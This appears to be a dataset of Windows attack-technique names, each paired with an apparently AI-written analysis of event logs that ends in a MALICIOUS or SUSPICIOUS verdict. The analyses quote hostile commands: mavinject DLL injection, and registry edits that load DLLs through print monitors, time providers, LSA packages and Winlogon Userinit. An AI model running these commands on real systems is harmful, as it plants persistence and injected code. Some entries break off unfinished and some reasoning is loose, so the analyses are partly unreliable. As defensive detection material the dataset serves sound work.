   - Event ID `4624` indicates successful logons for the `SYSTEM` account with Logon Type `5`, which is typically a service logon and generally not suspicious on its own. However, frequent successful logons might require further context, especially on a high-value target like the CEO's machine.
   - Event ID `4672` shows special privileges being assigned to the `SYSTEM` account. This is routine for system processes but should be monitored for anomalous usage.
   - Event ID `5379` shows credential access attempts that returned failure codes, indicating possible failed authentication or potentially probing of some kind.

2. **Sysmon Log:**
   - Event ID `1` shows suspicious process execution: `powershell.exe` was used to execute a binary from a temporary location `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\bin\\data.011_x64.exe`. This is highly suspicious because PowerShell is frequently used in malicious activities to download or execute payloads, especially from a location like a Temp directory.
   - The powershell.exe is logged multiple times alongside the execution of `data.011_x64.exe`, which is further suspicious and can indicate an attempt to execute a potentially harmful payload.

3. **Windows PowerShell Log:**
   - Multiple entries confirm that `powershell.exe` was invoked to execute a non-standard and potentially harmful executable. This corroborates findings in the Sysmon logs that highlight suspicious execution behavior.
   
### Assessment:

- The execution of PowerShell with the argument to run an executable from a temporary directory is alarming. This behavior is characteristic of malware infections or unauthorized execution of scripts. The path and filename `data.011_x64.exe` further raise red flags as they don’t correspond to standard or known applications.
- The presence of special privileges being assigned as seen in Security log entries could be leveraged by an attacker if combined with a successful exploit.

### Resolution:

Given the evidence of unconventional PowerShell usage to execute a potentially malicious file from a suspicious directory and the correlation with special privileges and authentication failures, it is clear that these findings point towards unauthorized and potentially harmful activities.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Isolation:** Quarantine the machine to prevent further propagation or data exfiltration.
2. **Increased Monitoring:** Enhance logging and monitoring on the host to catch any further anomalous behavior.
3. **Incident Response Engagement:** Involve the incident response team for deeper forensic investigation and to gather more evidence.
4. **Review and Scan:** Perform a deep scan using an updated malware detection tool on the complete filesystem.
5. **Password Changes:** Promptly change all passwords related to privileged accounts and review account logs for unauthorized access.
6. **Update Software:** Ensure all systems are up-to-date with security patches, particularly for PowerShell and Windows.

By taking these steps, you can mitigate and contain the potential threat detected within these event logs."
Print Processors,"After reviewing the provided Windows event logs, several indicators suggest potentially malicious activity:

1. **Suspicious PowerShell Activity**: There are multiple logs indicating the execution of PowerShell scripts with suspicious contents. PowerShell is being used to:
   - Modify the spooler service's startup type from ""Disabled"" to ""Automatic,"" stop it, copy a DLL, and then restart the service. 
   - The script copies `fileTest.dll` to `C:\\Windows\\System32\\spool\\prtprocs\\x64\\fileTest.dll` and modifies the registry key related to print processors. This behavior is commonly associated with DLL hijacking or EoP (Elevation of Privilege) exploits.
   
2. **Service Modification and Registry Changes**: The logs show the use of `reg.exe` to directly modify registry settings associated with print processors. The registry operation involves changing the driver entry to `fileTest.dll`, which could be an attempt to introduce a malicious DLL for execution at system startup.

3. **Process Execution Patterns**:
   - There is a sequence of events suggesting that the `wevtutil.exe` and `conhost.exe` are involved. `wevtutil` is a legitimate Windows utility for exporting and archiving event logs, but if misused could indicate an attempt to cover tracks by tampering with logs.
   - Repeated execution of `HOSTNAME.EXE`, `whoami.exe`, and `net.exe` which may indicate attempts to gather information about the system and its network configuration.

4. **Privilege Escalation Indicators**:
   - Multiple logs indicate processes were executed with elevated privileges, as seen in the high integrity levels and the use of the SYSTEM or admin account (`SERVER002\\admin_test`).

5. **Network Service Privilege**: Logs indicate manipulation of system services and the startup type for the spooler service.

6. **EDR Alert Trigger**: Considering that an alert was triggered on the CEO's machine, combined with the patterns identified, it strongly suggests a potential compromise of the system.

Given these factors, the activity logged is highly indicative of sophisticated malicious operations, potentially aiming to maintain persistence, perform privilege escalation, and establish a foothold for further exploitation.

**Resolution**: **MALICIOUS**

**Recommendations**:
- Isolate the affected system immediately to prevent further potential spread.
- Conduct a thorough forensic analysis to confirm and understand the full scope of the breach.
- Review and analyze any files associated with the PowerShell script and the DLL to identify and understand malicious payloads.
- Audit and tighten access controls and permissions on systems and network resources.
- Evaluate and apply system and security updates to patch any vulnerabilities.
- Monitor and enhance security logging and alerting to quickly identify and respond to similar activities in the future."
Process Injection via mavinject.exe,"### Analysis of Windows Event Logs

Upon examining the provided Sysmon and Windows PowerShell logs, I have identified several indicators that suggest potential malicious activity:

#### Sysmon Logs Observations
1. **PowerShell Usage**: Persistent usage of `powershell.exe` by the user `SERVER002\\admin_test` is evident. While PowerShell is a legitimate administrative tool, its use in this context is suspicious given the subsequent activity.
   
2. **Event `Invoke-Expression` or Code Injection**: The PowerShell command `mavinject $mypid /INJECTRUNNING \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\src\\x64\\data.001.dll\""` is executed. This activity is indicative of process injection, where a DLL file is injected into a running process (Notepad, in this case). This is a red flag for malicious activity, as it's commonly used by malware for persistence, privilege escalation, or evasion.

3. **Unusual Parent-Child Process Relationships**: The logs show instances where PowerShell is spawning seemingly unrelated processes such as Notepad, `wevtutil.exe`, and others. The use of `wevtutil.exe` alongside PowerShell could signify an attempt to tamper with Windows event logs or to export logs for further analysis elsewhere.

#### Windows PowerShell Logs
1. **Command Obfuscation and Execution**: The PowerShell logs confirm the execution of obfuscated or complex commands, which are generally not common in routine system administration.

### Assessment

Azure AD - Add Company Administrator Role to a user,"### Detailed Analysis of Logs

#### Observations:

1. **PowerShell Activity**:
   - **Suspicious PowerShell Activity**: In the PowerShell logs, there is an execution of a PowerShell script, initiated from `powershell.exe`, attempting to elevate privileges. The script imports the `MSOnline` module, creates a secure string password, builds a credential object, and tries to connect to a Microsoft Online service (`Connect-MsolService`). It further attempts to add a role member to the ""Company Administrator"" role.
     - **Command Overview**: 
       - `Import-Module MSOnline`
       - Password being converted and stored using `ConvertTo-SecureString`.
       - Credential object creation and connection to MSOL service.
       - Adding a role member with elevated privileges.

2. **Process Execution**:
   - **Sysmon Logs**: These logs capture several instances of PowerShell, conhost, whoami, and wevtutil executions under the `admin_test` user from `SERVER002`.
   - **Process Chain**: There is a process creation involving `PowerShell` being spawned by `wsmprovhost.exe`, which is often a sign of remote execution contexts (such as WinRM).
   - **Command and Control**: The syntax of the PowerShell commands and the elevation attempt is indicative of administrative action or a compromise attempt aiming at privilege escalation.

3. **Windows Update Events**:
   - These show normal operations of Microsoft updates, such as installing or checking updates, and don't directly indicate any malicious activity.

4. **Anomalies**:
   - The **privileged activity** through PowerShell not started by administrative actions and its attempt to interact with MSOnline services is highly suspicious.
   - The attempt to assign the ""Company Administrator"" role indicates an intent to gain elevated permissions in the Microsoft Online environment, which could lead to wider compromise.

5. **User Activity**:
   - The user `SERVER002\admin_test` is seen executing various PowerShell tasks, raising questions about unintended or unauthorized usage, especially in a session that has not been documented to originate from a legitimate administrative action.

#### Threats or Risks Identified:

- **Privilege Escalation Risk**: The logs reveal an attempted privilege escalation, suggesting a potential compromise of accounts or misuse by an internal user attempting administrative access across company resources.
- **Account Compromise**: The given passwords and accounts interact with MSOnline services, representing a risk of potential unauthorized access to sensitive company data or configurations.
- **Unauthorized Role Assignment**: Attempting to add users to company admin roles without a clear, documented necessity is an indicator of malicious intent.

#### Recommended Guidance:

- **Immediate Containment**: Terminate any suspicious processes associated with these operations; take the affected system offline if necessary.
- **Summary Analysis**: Perform a thorough forensic analysis of the machine’s activities and network connections around the timestamp of these events.
- **Password Changes**: Reset passwords for potentially affected accounts, especially those linked with the PowerShell activity.
- **Review Policies and Access Controls**: Examine user permissions and access grants, especially for `admin_test` and similar accounts.
- **Disable Unused Modules**: Secure PowerShell and other similar shells by implementing just enough admin (JEA) and disabling potentially dangerous modules unless needed.

### Resolution: **MALICIOUS**

The activities identified are characteristic of an attempted escalation of privileges and unauthorized access, deemed malicious in nature. Immediate action is recommended to prevent further potential breach or data exposure."
Persistence by modifying Windows Terminal profile,"Based on the provided Windows event logs, let's break down the notable entries and assess their significance:

### Sysmon Log Analysis
- Multiple instances of `powershell.exe`, `wevtutil.exe`, and `conhost.exe` processes were executed by the user `SERVER002\admin_test`.
- A notable command executed via `powershell.exe` involves moving a settings file and using `Invoke-WebRequest` to download a file from a Github URL (`https://github.com/file/file-file/blob/master/files/data.015/src/settings.json?raw=true`). This action is generally suspicious because:
  - **Downloading files from external sources using PowerShell** can indicate unwanted or malicious changes, particularly if done unprompted by the user.
  - **File alterations**, such as modifying settings files, raise concerns about persistence mechanisms or configuration changes which are stealthy and potentially unauthorized.

### PowerShell Log Analysis
- The logs reflect the same PowerShell activities observed in the Sysmon logs:
  - Host application invoked includes `powershell.exe` combined with suspicious actions such as moving files and fetching data from an external source.
  - The PowerShell versions and execution details are standard, but the context of actions (moving and downloading files) is suspicious without additional context or user intention.

### Indicators of Malicious Activity or Compromise
- **Network Activity via PowerShell**: The execution of `Invoke-WebRequest` without clear legitimate purpose, particularly to an external domain, often aligns with reconnaissance or staged payload download activities.
- **File Manipulation**: Moving critical files before downloading new versions from an unverified source could aim to overwrite configurations, setting the stage for further unauthorized actions.

### Threat Assessment
- **Risk Level**: High. Downloading and altering files using PowerShell indicates potential compromise since these activities, particularly from a CEO's machine, suggest targeted attempts to modify configurations or introduce unauthorized scripts.
- **Potential Threats**: 
  - Introduction of malware via downloaded scripts/files.
  - Establishment of persistence for future exploitation.
  - Information exfiltration attempts if sensitive configurations are altered to send data elsewhere.

### Resolution
The activity identified in the logs points to potentially unauthorized and suspicious behavior, primarily due to the use of PowerShell for file downloading and manipulation from an external source. This behavior needs further investigation to confirm whether any harm was intended or achieved, requiring a detailed review of network activities, additional logs, and potentially inspecting the integrity of effected files on `Server002`.

**Final Resolution:** SUSPICIOUS - The logs contain activity that requires further targeted investigation to confirm intentions and impact, considering the involvement of critical files and the download/source actions undertaken using PowerShell. Immediate preventative actions, such as alerting the involved parties, blocking the suspicious domain, and performing a thorough security audit, are advised."
Add Port Monitor persistence in Registry,"Upon analyzing the provided Windows event logs from the CEO's machine, here's the breakdown of suspicious or irregular activities identified:

1. **Sysmon Events and Command Execution:**
   - There are several entries where the `wevtutil.exe` process has been executed in rapid succession (`Sysmon EventID 5`). `wevtutil.exe` is a legitimate Windows utility used for managing event logs, but its frequent execution in such a short period can indicate an attempt to hide tracks or manipulate event logs, which is a common tactic used by attackers.
   - There is a specific command execution using `cmd.exe` with the command-line arguments related to the registry modification under the `HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\File` path, specifically for adding a DLL (`PortMonitor.dll`). This command has been executed with high integrity level and is suspect for potentially being used to establish persistence or load a malicious DLL into the system.
   - The presence of various other legitimate utilities running, such as `whoami.exe`, `hostname.exe` and several instances of `conhost.exe`, does not inherently indicate malicious activities but combined with registry modification and `wevtutil`, suggests suspicious behavior.

2. **Registry Modification:**
   - The process `reg.exe` is observed modifying the Windows registry. The modification command has been executed using a high integrity level, targeting the print monitor DLL registration. This type of modification can be used for persistence or dll injection attacks.

3. **Microsoft Edge Update Activity:**
   - Logs show multiple executions of `MicrosoftEdgeUpdate.exe` and associated files. While it appears to be legitimate update checks, ensuring the hashes and signatures confirm the integrity of these executables is necessary to rule out any tampering.

4. **Time Synchronization:**
   - There are logs indicating the system time has been adjusted slightly. Although this in itself is not suspicious since these entries could be indicative of normal NTP synchronization activities aligning with `time.windows.com`.

Based on the aforementioned points, here's the assessment:

- **Assessment:**
  - The observed activity of utilizing system utilities like `wevtutil.exe`, `reg.exe` with suspicious command-line arguments primarily points towards attempts for persistence and possibly an initial stage of exploitation.

- **Resolution:**
  - **SUSPICIOUS**: The logs demonstrate potentially malicious use of native utilities and registry modifications need to be further investigated for risk assessment. 

- **Guidance for Proceeding:**
  - Conduct further investigation into the purpose and origin of the `PortMonitor.dll` to validate its legitimacy.
  - Cross-reference with known threat intelligence to see if the DLL or the command line pattern matches known exploits.
  - Check for any additional anomalous behavior or artifacts on the system that might indicate a compromise.
  - Ensure that sound backup and recovery processes are in place in case remediation or system restoration is needed."
Azure - adding service principal to Azure role in subscription,"### Analysis of Logs:

#### Windows PowerShell Log:
- **Suspicious Execution:** The PowerShell logs show the execution of a script that attempts to connect to an Azure account using credentials stored in plain text. This execution involves:

  1. **Importing Azure Module:** `Import-Module -Name Az.Resources`
  2. **Credential Handling:** `ConvertTo-SecureString -String \""p4sswd\"" -AsPlainText -Force` and storing in `$PWord`.
  3. **Service Principal Assignment:** Assigning ""SuperSP"" to a 'Reader' role in ""Azure subscription 1"".

- **Concerns:**
  - The password is included as plaintext, a major security risk often used for unauthorized access.
  - The specific targeting of Azure resources raises suspicion as unauthorized users may exploit these privileges.

#### Security Log:
- **User Enumeration via CompatTelRunner.exe:** 
  - Multiple accounts including ""Guest"", ""Administrator"", ""admin_test"" etc., were accessed seemingly through `CompatTelRunner.exe` which is a Windows telemetry component.
  
- **Concerns:**
  - The enumeration of accounts via an unexpected process suggests potential reconnaissance activities.
  - The scope of accounts accessed, including administrative accounts, indicates a possible initial attempt to access privilege accounts or test the reach of access.

#### Sysmon Log:
- **Process and User Activity Details:**
  - Execution of PowerShell and other system utilities (`whoami.exe`, `hostname.exe`) by `admin_test`.
  - The repetitive use of system utilities (`wevtutil.exe`, `svchost.exe`) from `admin_test` indicates active manipulation or investigation of system logs/configurations.
  
- **Concerns:**
  - High-level integrity running commands like `wevtutil.exe` potentially indicates clearing or manipulation of event logs.

### Assessment:

Based on the above findings, the following suspicions arise:
- **Potential Credential Theft/Exfiltration:** The use of PowerShell for Azure interactions with hardcoded credentials suggests the potential for data exfiltration or unauthorized access to subscription data.
  
- **Account Enumeration and Log Investigation:** The security log activity indicates user/access enumeration which may precede privilege escalation or lateral movement attempts.

- **Use of Telemetry as a False Flag or Recon Tool:** `CompatTelRunner.exe` utilized for user enumeration is atypical; it potentially indicates bypass activity for normal detection.

### Resolution:

**SUSPICIOUS**

While there's no definitive evidence of active compromises such as data exfiltration or changes made to system-critical files, the behavior observed is highly irregular and aligns with recognized patterns of unauthorized access attempts. Further investigation is warranted with specific guidance such as:

- **Immediate action:** Validate if the PowerShell script is authorized, check for unauthorized role assignments in Azure.
- **Monitor and Investigate:** Track any further use of telemetry tools and review logs for anomalies across other systems.
- **User Behavior Analysis:** Analyze 'admin_test' user's activity patterns over time for non-standard access or execution patterns.
- **Implement Security Posture Enhancements:** Strongly consider implementing alerts for plaintext password usage and unexpected use of system utilities. 

Further cooperation with IT and Azure admin teams is recommended to ensure closed loopholes and no ensuing anomalies."
TinyTurla backdoor service w64time,"Upon examining the provided event logs, several indicators suggest the presence of potentially malicious activity:

1. **Time Manipulation**: The initial logs indicate attempts to manipulate the system time (event IDs 4616, 1 in the System log), which is often suspicious, as altering system time can undermine security measures, logs integrity, or evade detection mechanisms.

2. **Privileged Account Activity**: The logs show the `admin_test` user, who seems to possess a high privilege level, performing actions such as attempting to change system time and executing a sequence of commands using `cmd.exe` (captured in the Sysmon log). The privileges include `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, among others, which are highly sensitive those suggesting elevated permissions possibly indicative of privilege escalation (event ID 4672).

3. **Command-Line Execution**: There is a command executed via `cmd.exe` that involves copying and DLL hijacking activities. This command seems to be creating or altering the `W64Time` service with paths to system directories (event ID 1 in Sysmon). The command alters the registry and sets up a service to start automatically, a behavior consistent with persistence mechanisms used by malware.

4. **Service Creation and Modification**: The `W64Time` service is created and configured with descriptions and displays to seem like a legitimate time synchronization service (event IDs 7045, 7023 in System log, and multiple events in Sysmon log). This behavior matches typical tactics for creating backdoors or persistent footholds on a system.

5. **Use of System Utilities**: The frequent use of `wevtutil.exe`, `sc.exe` (for service creation), and `reg.exe` for registry manipulation within the Sysmon logs is consistent with techniques often used in lateral movement and persistence. The absence of a legitimate parent process also raises concerns about these activities being orchestrated by an unauthorized agent using a compromised account or script.

6. **New and Unusual File Activity**: Commands executed include copying files to protected directories (`w64time.dll` to `%systemroot%\\system32\\`), indicating an attempt to place potentially unauthorized or malicious files into a sensitive location.

7. **Multiple Entries of Privilege Actions**: The repeated high-level privilege actions that `admin_test` executes could indicate misuse either by an insider threat or by an actor with stolen credentials.

8. **Lack of Benign Context**: Overall, the actions described demonstrate a structured approach to exploiting and potentially maintaining access to the compromised system, without indicators of typical benign administrative context or timing.

### Conclusion:
Given this series of observations, the activities recorded in these logs are indicative of a compromise and reflect typical malicious behavior, such as privilege escalation, persistence, and potential system control through service manipulation.

**Resolution**: **MALICIOUS**

### Guidance on How to Proceed:
- **Immediate containment**: Disable the `admin_test` account, isolate `Server002` from the network to prevent further spread or data exfiltration.
- **Forensic analysis**: Conduct a thorough forensic investigation to identify any other compromised accounts, additional backdoors, or affected systems.
- **Remediation steps**: Patch any vulnerabilities used, and undo any unauthorized changes to the system such as registry edits or added DLLs.
- **Conduct an incident response drill**: Utilize the findings to update incident response plans and conduct awareness training to prevent future incidents."

Edit an existing time provider,"### Detailed Analysis of Logs ####

#### Suspicious or Anomalous Behavior ###
1. **PowerShell Activity**: 
   - The command executed via PowerShell is suspicious, specifically targeting Windows Time Service (W32Time). The script performs the following:
     - Stops the W32Time service.
     - Copies a DLL `fileTest.dll` from a temporary location to `C:\Users\Public\`.
     - Modifies the registry to change the DLL used by the W32Time service:
       - `DllName` set to the newly copied `C:\Users\Public\fileTest.dll`.
       - Enables the time provider with altered registry settings.
     - Restarts the W32Time service.
   - This type of modification is typical in attempts to execute malicious code as a DLL via a service, suggesting potential privilege escalation or persistence mechanism.

2. **Windows Time Service Failures**: 
   - Event ID 4 in the System log indicates the `NtpServer` provider failed to start with an error ""The specified module could not be found (0x8007007E)"", pointing to an issue with loading the specified DLL.
   - This aligns with the PowerShell script's alteration to the time provider's DLL, confirming specific actions were executed, but the module could not be subsequently loaded.

3. **Use of Native System Utilities**:
   - Repeated execution of native tools (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `net.exe`, and `reg.exe`) often correlated with automation or scripting activities. In this context, these actions were potentially driven by the aforementioned PowerShell script.

4. **Registry Manipulation via `reg.exe`**:
   - Changes to registry keys associated with the `W32Time` service to redirect to a potentially malicious DLL found in the temp directory.
  
5. **Presence of `admin_test` User**:
   - All malicious activities were conducted under the `admin_test` user account, which indicates it may be compromised or utilized for persistent access.

#### Indicators of Malicious Activity or Compromise ####
- The modification of W32Time's DLL is a significant red flag, aligning with known techniques of persistence.
- Execution of a potentially harmful PowerShell script which integrates with system registry and services.
- Alterations appear directed to execute a DLL from an unfamiliar source likely intended to achieve an unspecified end goal.

### Assessment ###

Given the evidence, the activities depicted within these logs strongly indicate compromise, orchestrated through a PowerShell script designed to alter system functionality illicitly. The failure to load the `NtpServer` DLL signifies a potential attempt at exploitation.

### Guidance ###

Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry,"Upon reviewing the provided set of Windows event logs, there are several events of interest that require further investigation. Below is a detailed analysis highlighting both routine and suspicious activities, focusing particularly on indicators that might suggest malicious behavior:

1. **Routine Operations:**
   - **Microsoft Edge Update:**
     - Several processes from the Microsoft Edge Update are seen executing, which typically is expected behavior for update mechanisms (`MicrosoftEdgeUpdateComRegisterShell64.exe`, `MicrosoftEdgeUpdate.exe`).
     - Logs showing processes such as `whoami.exe` and `conhost.exe` running can be considered normal, as they often act as utility processes and console hosts.

2. **Suspicious Activities:**
   - **Event Log Clearance:**
     - An event (event ID 104) shows that the Windows PowerShell and System logs were cleared by the user `admin_test`. This activity is highly suspicious, as clearing event logs is usually attempted by adversaries to cover their tracks.
     
   - **PowerShell Usage:**
     - The PowerShell logs display a script execution which modifies registry values related to `Security Packages` in the LSA configuration. The script replaces these values with what appears to be a non-standard DLL (`AtomicTest.dll`). This could indicate an attempted persistence mechanism or privilege escalation.
     - The command executed in PowerShell suggests that the system might be targeted for a known attack vector, possibly linked to test techniques used by threat actors or penetration testers.

3. **Potential Malicious Indicators:**
   - The invocation of Windows PowerShell to modify security settings via registry is a common tactic used by attackers to establish persistence or add unauthorized authentication backdoors.
   - The clearing of Windows event logs is a classic post-exploitation tactic to erase evidence of malicious activity or intrusion.

Based on the analysis of these logs, it is reasonable to assume that there might be an active or past compromise involving unauthorized system modifications and log clearance, which are indicative of suspicious or potentially harmful activity.

**Resolution: SUSPICIOUS**

**Guidance:**
- Conduct a comprehensive security audit of the system to look for any signs of unauthorized access or changes.
- Re-examine the user `admin_test` activities around the time when logs were cleared.
- Verify the integrity of critical system binaries and configurations, especially regarding security packages.
- Check for known indicators related to the use of `AtomicTest.dll` and investigate whether this script is part of legitimate penetration testing or a malicious attempt.
- Enable enhanced logging and monitoring to detect further unwanted activities.
- Consider isolating the machine for more in-depth forensic analysis to prevent potential lateral movement within the network."
HKLM - Append Command to Winlogon Userinit KEY Value,"In reviewing the provided Windows event logs, my analysis highlights several points of interest:

### Analysis of Logs

**1. PowerShell Logs:**
   - The PowerShell logs contain an execution of a command that alters the Windows registry. Specifically, it modifies the `Userinit` registry key located at `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`. The executed command reads the current value of `Userinit`, backups the existing value to `Userinit-backup`, and appends `C:\Windows\System32\calc.exe` to the `Userinit` key. 
   - This behavior is a common technique used by attackers. By appending a benign program like `calc.exe` to the `Userinit` key, the attacker ensures the execution of additional programs during user logon, potentially for persistence.

**2. Sysmon Logs:**
   - Multiple Sysmon events captured show standard Windows system processes running under an administrative user (`SERVER002\admin_test`). However, the listed processes are typical system utility executions and do not, in isolation, indicate malicious activity.
   - The logs also cover activities related to the update of Microsoft Edge, specifically showing the execution of the `MicrosoftEdgeUpdate` processes, which are part of a legitimate software update mechanism by Microsoft.

**3. Application Logs:**
   - The Application logs show typical entries related to the Microsoft-Windows-Security-SPP service, primarily focusing on the software protection platform activities, which appears routine.

### Assessment

- **Suspicious Behavior:** The PowerShell execution modifying critical registry keys related to user logon is concerning. This type of registry modification is not typical in regular operations, particularly on a high-profile machine like the CEO's.
- **Legitimate System Activity:** While Sysmon captures show legitimate processes such as Windows system utilities and Microsoft Edge updates, these do not directly indicate compromise.

### Conclusion & Resolution

Given the available evidence of registry modification and the context of this behavior, the activity in the logs can be classified as:

**Resolution: MALICIOUS**

### Recommendations

1. **Immediate Remediation:**
   - Restore the `Userinit` registry key to its original state.
   - Conduct a thorough scan of the system using updated antivirus and antimalware solutions to identify any further malicious activities.
   
2. **Forensic Investigation:**
   - Preserve and analyze related log data to determine the entry point of this PowerShell execution.
   - Examine user access logs to identify any unauthorized account accesses or anomalies related to `admin_test`.

3. **Security Measures:**
   - Implement tighter security controls over PowerShell execution and monitor scripts running on high-profile machines.
   - Enhance user training on detecting and preventing unauthorized registry changes. 

By addressing these points, the risk of ongoing or further malicious activity can be effectively mitigated."
Azure AD Application Hijacking - Service Principal,"Upon reviewing the provided logs, here is the detailed analysis:

### Suspicious Behavior Identified:
1. **PowerShell Activity**:
   - The PowerShell script is attempting to use Azure AD commands to connect as a user (`jonh@contoso.com`) and interact with Azure Active Directory Service Principals. This script includes operations such as generating a self-signed certificate, attempting application hijacking, and establishing AzureAD connections using a certificate thumbprint.
   - Explicit comments within the script indicate the intention to simulate an ""Application Hijacking,"" with language suggesting a backdoor creation, though the comments suggest this might be an ART (Adversary Replication Test) scenario.
   
2. **Sysmon Logs**:
   - Multiple instances of PowerShell, conhost, and wevtutil processes are recorded with high integrity levels, indicating that an admin-equivalent account (`SERVER002\\admin_test`) executed these processes, which were not inherently malicious but were involved in the suspicious PowerShell execution chain.
   - The script initiates processes like `wevtutil` and manipulates AzureAD which may indicate log file tampering or credential/theft – commonly associated with obfuscation or evasion techniques by attackers.
   - `wevtutil.exe` was used notably to export event logs which could be indicative of a data exfiltration step, capturing logs for stealth or analysis by an adversary.

### Assessment & Conclusion:
- **Indicators of Compromise (IOC)**:
  - Usage of `ConvertTo-SecureString` to handle plaintext-like passwords.
  - Creation of self-signed certificates and manipulation of Azure AD Service Principals appear to be a hallmark of credential theft or lateral movement attempts.
  - The potential for ""Application Hijacking"" denoted in the PowerShell script, further adds to the suspicion.

- **Possible Threats/Risks**:
  - If this script was executed with malicious intent, it could lead to unauthorized access to resources, potentially compromising sensitive data.
  - Certificate manipulation and log exports could signify groundwork for persistence mechanism setup or data exfiltration.

- **Guidance**:
  - Verify the legitimacy and authorization of the PowerShell script execution. Confirm if it was indeed part of a sanctioned security test (ART) the logs suggest but do not conclusively affirm.
  - Conduct a thorough review of the affected Azure AD environment, including credentials, permissions, and existing service principals for anomalies or unauthorized changes.
  - Cross-verify with other security logs (e.g., network logs, other endpoint agents) to confirm any lateral movement or unusual data shifts.
  - If unauthorized or unapproved, isolate the affected account/machine pending further investigation, considering immediate revocation of credentials and resetting service principal associations.

### Resolution:
- **SUSPICIOUS** - The activity captured by the logs requires further investigation to affirm the nature of the PowerShell script execution. Depending on the confirmation of ART scenario or unauthorized activity, corrective actions must be determined accordingly."
Creating Boot Verification Program Key for application execution during successful boot,"Based on the analysis of the provided logs, here is a detailed breakdown of any suspicious or anomalous behavior:

1. **Time Discrepancy:**
   - System logs indicate time change events (`EventID 1` from `Kernel-General`) where `svchost.exe` was involved in changing the system time. While this process is legitimate for time synchronization, alteration of system time can sometimes be used to disguise actions taken by an attacker. However, the involvement of `svchost.exe` matches expected behavior for time sync tasks.

2. **Process Execution:**
   - In the Sysmon logs, multiple instances of `wevtutil.exe` and `conhost.exe` are executed by the user `SERVER002\admin_test`. `wevtutil.exe` is a tool to retrieve information about event logs and publishers. Frequent execution deserves attention but isn't inherently malicious without context showing misuse.
   - A `cmd.exe` process executed a registry modification command that added an `ImagePath` for `iexplore.exe`, which could potentially be a form of persistence or manipulation tactic, altering boot verification programs.

3. **High Privilege Processes:**
   - The execution of `cmd.exe` and `reg.exe` with actions affecting the registry indicates a high privilege operation (implied by the ""High"" integrity level). Such actions are concerning and warrant further investigation in case of unauthorized privilege usage.

4. **Security Events:**
   - The security logs capture a `Logon` event (`EventID 4624`) with a subsequent assignment of many privileges (`EventID 4672`), including `SeDebugPrivilege`, indicating potentially elevated permissions for `SERVER002\admin_test`. This indicates that this account has considerable privileges that need verification for legitimacy.

5. **Software Updates:**
   - There are numerous events related to the execution of `MicrosoftEdgeUpdate.exe`. The event logs show repeated installation/update instructions, which seem consistent with updating software, but with such frequent repetition, verifying the legitimacy of these updates would be advisable.

Based on this detailed log analysis, the overall assessment classifies the situation as **SUSPICIOUS**. While there are no explicit indicators of a known attack, the registry changes, time manipulation, privilege assignments, and frequent update activities warrant a closer review to ensure they are legitimate.

**Guidance:**
- Investigate the context and necessity behind the `cmd.exe` registry changes. Cross-reference with IT asset change logs or administrative actions.
- Verify the legitimacy of the user account `SERVER002\admin_test` and review any recent changes to account policies or privilege allocations.
- Assess the software update process for Microsoft Edge to confirm it's part of a scheduled or legitimate update from reputable sources.
- Monitor for any further unexpected behavior and consider applying additional logging or monitoring on the system. If needed, consult with IT stakeholders for any further action such as rolling back changes or modifying account privileges."
